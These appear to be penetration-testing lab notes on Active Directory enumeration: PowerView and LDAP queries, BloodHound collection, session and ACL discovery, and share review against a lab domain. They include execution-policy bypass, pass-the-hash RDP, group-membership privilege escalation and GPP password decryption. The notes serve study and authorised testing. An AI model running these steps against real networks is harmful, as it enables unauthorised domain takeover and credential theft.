# AD Enumeration

Active Directory (AD), is a service that acts as management layer and allows system administrators to update and manage operating systems, applications, users, and data access on a large scale.

An AD environment has a critical dependency on the Domain Name System (DNS) service. A typical domain controller will host a DNS server that is authoritative for the given domain. Since the Domain  Controller (DC) is such a central domain component, we'll also pay  attention to DC as we enumerate AD.

## AD Enum Automation Tools

Goals

* Get network situational awareness of Windows AD domains
* Use [PowerView.ps1](https://powersploit.readthedocs.io/en/latest/Recon/#powerview) to do more than user and group member enumeration

Scenario

* Domain User credentials are known to us
* Domain User has Remote Desktop permissions on machine wihtin the domain
* Limitation: User is NOT a local admin
* Asumptions: Start enum  with lower privileged user and repeat enum with each compromised user (pivot)

Attacker

```bash
xfreerdp3 +clipboard /cert:ignore /d:corp.com /u:user /v:IP /p:'Passw@rd!!'

```

Victim

```powershell
powershell -ep bypass
Import-Module -Force PowerView.ps1

Get-NetDomain

Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser | select cn, memberof
Get-NetGroup | select cn
Get-NetGroup "Some Group" | select member

# Search for AD user details
Get-NetUser > users.txt
gc users.txt | select-string "username" -Context 3

```

## AD Enum Manual

Goals

* Compromise members of **Domain Admins** to gain control over **Domain Tree**.s
* Compsromise members of **Enterprise Admins** to gain full access over all DCs in the **Domain Forest**.

Scenario

* Domain User credentials are known to us
* Domain User has Remote Desktop permissions on machine wihtin the domain
* Limitation: User is NOT a local admin
* Asumptions: Start enum  with lower privileged user and repeat enum with each compromised user (pivot)

Attacker

```bash
xfreerdp3 +clipboard /cert:ignore /d:corp.com /u:user /v:IP /p:'Passw@rd!!'
xfreerdp3 +clipboard /cert:ignore /u:"DOMAIN\\User" /v:IP /pth:hidden-hash
```

Victim

```shell
# List domain users and groups to enum Domain Admins or Enterprise Admins
# Limitations: lists no nested groups, no specific attributes 
net user /domain
net user "someuser" /domain
net group /domain
net group "somegroup" /domains
```

```powershell
# LDAP enumeration using Active Directory Service Interfaces (ADSI) 
# LDAP://HostName[:PortNumber][/DistinguishedName]
# e.g. CN=Jeff,DC=corp,DC=com
notepad LDAPEnum.ps1

# LDAP search with ldap query
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    # Get the Primary DC (PDC) with PdcRoleOwer = ...
    $pdc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    # Get LDAP destinguied name
    $dn = ([adsi]'').distinguishedName
    # Build LDAP path
    $ldap = "LDAP://$pdc/$dn"
    # Search from LDAP domain root directory endpoint
    $direntry = New-Object System.DirectoryServices.DirectoryEntry($ldap)
    $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry, $LDAPQuery)
    return $dirsearcher.FindAll() 
}

function LDAPEnumUsers {
  return LDAPSearch("(objectcategory=user)") | % { $_.properties.cn};
}

function LDAPEnumGroups {
  return LDAPSearch("(objectcategory=group)") | % { $_.properties.cn};
}

function LDAPEnumGroupMembers {
  return LDAPSearch("(objectcategory=group)") | % { "[*] Group",$_.properties.cn,"[+] Members",$_.properties.member }
}

function LDAPSearchGroupMembers {
   param (
        [string]$LDAPGroup
   )
   
   return LDAPSearch("(&(objectCategory=group)(cn=$LDAPGroup))") | % { $_.Properties.member }
}

function LDAPSearchUser {
   param (
        [string]$LDAPUser
   )
   return LDAPSearch("(name=$LDAPUser)") | % { $_.properties | Format-Table }
}
```

```powershell
powershell -ep bypass
Import-Module -Force .\LDAPEnum.ps1

LDAPEnumUsers
LDAPEnumGroups
LDAPEnumGroupMembers | select-string -Context 3 "Personnel"
LDAPSearchGroupMembers "Service Personnel"
LDAPSearchUser "nicole"

```

Advanced Manual LDAP Search

```powershell
# AD User search
LDAPSearch -LDAPQuery "(name=jeff)"
LDAPSearch -LDAPQuery "(name=jeff)" | % { $_.properties | Format-Table }
LDAPSearch -LDAPQuery "(name=jeff)" | % { $_.properties.PropertyNames }

# AD User enumeration
LDAPSearch -LDAPQuery "(objectcategory=user)" | % { $_.properties.cn}
LDAPSearch -LDAPQuery "(samAccountType=805306368)" | % {$_.properties.cn}

# Enumerate groups and members 
LDAPSearch -LDAPQuery "(objectcategory=group)" | % { "[*] Group",$_.properties.cn,"[+] Members",$_.properties.member }
Foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member} }

# AD Group enumeration
LDAPSearch -LDAPQuery "(objectclass=group)" | % { $_.Properties.cn}

# AD Group nested member enumeration
LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))" | % { $_.Properties.member }
```

## Automatic Active Directory Enumeration

Goal

* Collect domain data using [SharpHound](https://github.com/SpecterOps/SharpHound/releases) 
* Analyze the data using [BloodHound](https://www.kali.org/tools/bloodhound/)
* Manual analyze further with PowerView

```powershell
Import-Module .\Sharphound.ps1

Get-Help Invoke-BloodHound 
# -ZipPassword
# -EncryptZip

# Run snapshot of all with BloodHound 
Invoke-BloodHound -CollectionMethods All -OutputDirectory "$env:USERPROFILE\Desktop" -OutputPrefix "corp_audit" # user desktop

# Specify a loop duration to for sessions, default is 2 hour (here 10min)
SharpHound.exe --CollectionMethods Session --Loop --Loopduration 00:10:00
```

Prepare for analysis

```bash
(user@kali)~
sudo apt install -y bloodhound
 sudo bloodhound-setup
s
sudo neo4j start
firefox http://localhost:7474

# change credentials from neo4j:neo4j 
# update BloodHound API secret
sudo vi /etc/bhapi/bhapi.json
grep -P -A 1 "(neo4j|admin)" /etc/bhapi/bhapi.json

# start analysis
bloodhound
```

Analysis-Steps

* Administration -> Database Management -> All Graph Data -> Delete
* Administration -> File Injgest -> Upload files
* Administration -> Data Quality
* Explorer -> Cypher -> Open Directory
  * Domain Admins
  * Admin Logons to NOT Domain Controllers
  * Find Shortest Path to Domain Admins
  * **Shortest Path from Owned Pricipals**
  * **Shortest Path to Domain Admins from Owned Priciples**
  * Shortest Path to systems trusted for unconstrained delegations
  * Location of High Value Objects
  * Computer where Domain User are LocalAdmins (Enterprise only)
* Explorer -> Selected Nodes
  * Object Information
  * **Sessions**
  * Members
  * MembersOf
  * Outbound Control Objects -> GenericAll Permission

```shell
# Find-LocalAdmins on all Domain Computers 
# jq using with Bloodhound (output)
jq '                                    
  .data
  | map({ (.ObjectIdentifier): .Properties.name })
  | add
' corp_audit_20250912022035_users.json > sid_to_name.json

jq --slurpfile sidmap sid_to_name.json '
  .data[]
  | {
      ComputerName: .Properties.name,
      DomainLocalAdmins: [.LocalAdmins.Results[]?.ObjectIdentifier 
      | select($sidmap[0][.]) 
      | {SID: ., Username: $sidmap[0][.]}]
    }                                           
' corp_audit_20250912022035_computers.json



```

## Manual Active Directory Enumeration

Goal

* Create a Domain Map by ...
* Enumerate Operating Systems
* Enumerate permission and logged on users
* Enumerate through Service Principal Names (Service Accouts)
* Enumerate Object Permissions
* Enumerate and Explore Domain Shares

Scenario

* We have compromised a Domain User account and try to create a domain map
* Use **PowerView.ps1** from [PowerSploit Tools](https://live.sysinternals.com/)
* Use **PsLoggedOn** from [SysInternal Tools](https://live.sysinternals.com/)
* Use ***Default AD Security Group** from [MS Docu](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#default-security-groups)

```powershell
powershell -ep bypass
Import-Module PowerView.ps1
```

Enumerate Operating Systems

```powershell
# Enum Domain Computers
Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname,distinguishedname
```

Enumerate permission and logged on users

```powershell
# Find Domain Computers with local Administator access 
Find-LocalAdminAccess

# Find Logged-on users on domain computers with Sysinternal tool PsLoggedOn
# Uses Remote Registry Service
# Limitation:
# Disabled by default Windows 8 and later 
# Enabled by default on Windows Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2)
.\PSLoggedOn # local machine 
.\PsLoggedOn \\files01 # remote machine

# Find Logged-on users on domain computers
# Uses NetWkstaUserEnum and NetSessionEnum
# Limitation: 
# Windows 10 Pro 16299 build 1709 or before
# Windows Server 2019 build 1809 or before
Get-NetSession # local machine
Get-NetSession -ComputerName granted # remote machine
Get-NetSession -Verbose -ComputerName denied # trouble shooting

# Get-NetSession returns invalid output, because the user does NOT have DefaultSecurity the required permissions ReadKey, FullControll
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | Format-List

```

Enumerate Service Principal Names (Service Accouts)

* Service accounts are LocalSystem, LocalService, and NetworkService.
* Group Managed Service Accounts (gMSA) require Windows Server 2012 or higher
* Service Principal Name (SPN) associates a service to a specsific service account in Active Directory

```powershell
# Enum Service Principal Names
Get-NetUser -SPN | select name,serviceprincipalname # all users
setspn.exe -L iis_service # user
nslookup.exe web04.corp.com
```

Enumerate Permissions on AD Object using ACL

* GenericAll: Full permissions on object
* GenericWrite: Edit certain attributes on the object
* WriteOwner: Change ownership of the object
* WriteDACL: Edit ACE's applied to object
* AllExtendedRights: Change password, reset password, etc.
* ForceChangePassword: Password change for object

```powershell
# Enum AD User ACL
$users=Get-ObjectAcl -LDAPFilter "(objectCategory=user)" | select objectDN, ObjectSID | Unique -AsString

# Enum AD Group ACLs
$groups=Get-ObjectAcl -LDAPFilter "(objectCategory=group)" | select objectDN, ObjectSID | Unique -AsString

# Enum AD Users with permission on other AD Users by SecurityIdentifier
$objects = ($users | % { $u = $_; $users | % { $o = $_; Get-ObjectAcl -DistinguishedName $o.ObjectDN | ? { $_.SecurityIdentifier -eq $u.ObjectSID } } } )

# Enum AD Users with permissions on AD Groups
$objects = ($users | % { $u = $_; $groups | % { $g = $_; Get-ObjectAcl -DistinguishedName $g.ObjectDN | ? { $_.SecurityIdentifier -eq $u.ObjectSID } } } )

# Enum AD Groups with nested permissions on AD Group
 $objects = ($groups | % { $nested = $_; $groups | % { $g = $_; Get-ObjectAcl -DistinguishedName $g.ObjectDN | ? { $_.SecurityIdentifier -eq $nested.ObjectSID } } } ) 

# Focus on "GenericAll" permission
# Focus on ObjectDN, ActiveDirectoryRights, SecurityIdentifier
$objects | ? ActiveDirectoryRights -eq "GenericAll"
$objects | ? ActiveDirectoryRights -eq "GenericWrite"
$objects | ? ActiveDirectoryRights -eq "AllExtendedRights"
$objects | % { $_; $si=$_.SecurityIdentifier; $name=$(Convert-SidToName $_.SecurityIdentifier); "[*] $si -> $name" }

ObjectDN              : CN=Management Department,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-1987370270-658905905-1781884369-1104

[*] S-1-5-21-1987370270-658905905-1781884369-1104 -> CORP\stephanie

# Privilege escalation via AD group
net group "Management Department" stephanie /add /domain

# Convert SID to AD Username
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie

# List Ad User ACLs
Get-ObjectAcl -Identity stephanie ## user
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
...

# Focus on GenericAll Permission on AD Users
Get-ObjectAcl -Identity "stephanie" | where activedirectoryrights -eq "genericall" | select securityidentifier,activedirectoryrights | fl
Get-ObjectAcl -Identity "stephanie" | where activedirectoryrights -eq "genericwrite" | select securityidentifier,activedirectoryrights | fl
Get-ObjectAcl -Identity "stephanie" | where activedirectoryrights -eq "allextendedrights" | select securityidentifier,activedirectoryrights | fl 

# Focus on GenericAll Permisison on AD groups
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights | fl
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericWrite"} | select SecurityIdentifier,ActiveDirectoryRights | fl
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "AllExtendedRights"} | select SecurityIdentifier,ActiveDirectoryRights | fl

```

Manual Active Directory Share Enumeration

* Focus on `SYSVOL` may reveal files and directories on the DC
* Default directory on DC `%SystemRoot%\SYSVOL\Sysvol\domain-name`
* List and Review Policy and Scripts
* [Decrypt](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2) GPP configured Local Administrator Passwords
* Windows default shares are e.g. IPC$, ADMIN$$, C$
* Focus on NON-default shares

```powershell
Find-DomainShare # all shares
Find-DomainShare -CheckShareAccess # available to the attacker

Name           Type Remark                 ComputerName
----           ---- ------                 ------------
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com
docshare          0 Documentation purposes FILES04.corp.com
Users             0                        FILES04.corp.com
ADMIN$   2147483648 Remote Admin           client74.corp.com
C$       2147483648 Default share          client74.corp.com
ADMIN$   2147483648 Remote Admin           client75.corp.com
C$       2147483648 Default share          client75.corp.com

# SYSVOL policies and scripts
ls \\dc01.corp.com\sysvol\corp.com\
ls \\dc01.corp.com\sysvol\corp.com\Policies\
ls \\dc01.corp.com\sysvol\corp.com\Scripts\

   Directory: \\dc01.corp.com\sysvol\corp.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts
```

```bash
(user㉿kali)~
# Decrypt Password configured by Group Policy Preference (GPP)
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```